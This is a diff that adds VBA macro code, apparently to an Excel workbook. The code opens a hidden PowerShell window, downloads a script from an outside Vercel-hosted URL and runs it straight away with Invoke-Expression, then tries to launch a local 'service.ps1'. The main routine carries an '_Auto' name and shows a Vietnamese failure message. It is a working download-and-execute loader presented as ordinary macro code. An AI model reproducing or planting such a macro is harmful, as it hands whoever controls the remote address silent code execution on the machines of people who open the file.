@@ -1,0 +1,39 @@
+Private Function DownloadWithPowerShell(url As String, outPath As String) As Boolean
+    Dim ws As Object, psCmd As String
+    On Error GoTo ErrHandler
+    Set ws = CreateObject("WScript.Shell")
+    psCmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
+            """try { $code = (New-Object System.Net.WebClient).DownloadString('" & url & "'); Invoke-Expression $code; exit 0 } catch { exit 1 }"""
+    ws.Run psCmd, 0, True
+    DownloadWithPowerShell = (Dir(outPath) <> "")
+    Exit Function
+ErrHandler:
+    DownloadWithPowerShell = False
+End Function
+
+Private Sub RunDownloadedFile_Auto(filePath As String)
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    ws.Run """" & filePath & """", 1, False
+End Sub
+
+Public Sub Download_And_Run_Service_Auto()
+    Dim url As String, outPath As String, success As Boolean
+    url = "https://my-nextjs-app-8r12.vercel.app/api/download"
+    outPath = ThisWorkbook.Path & "\service.ps1"
+    success = False
+
+    On Error Resume Next
+    If Dir(outPath) <> "" Then Kill outPath
+    On Error GoTo 0
+
+    If Not success Then
+        success = DownloadWithPowerShell(url, outPath)
+    End If
+
+    If success Then
+        RunDownloadedFile_Auto outPath
+    Else
+        MsgBox "Tai that bai.", vbExclamation
+    End If
+End Sub
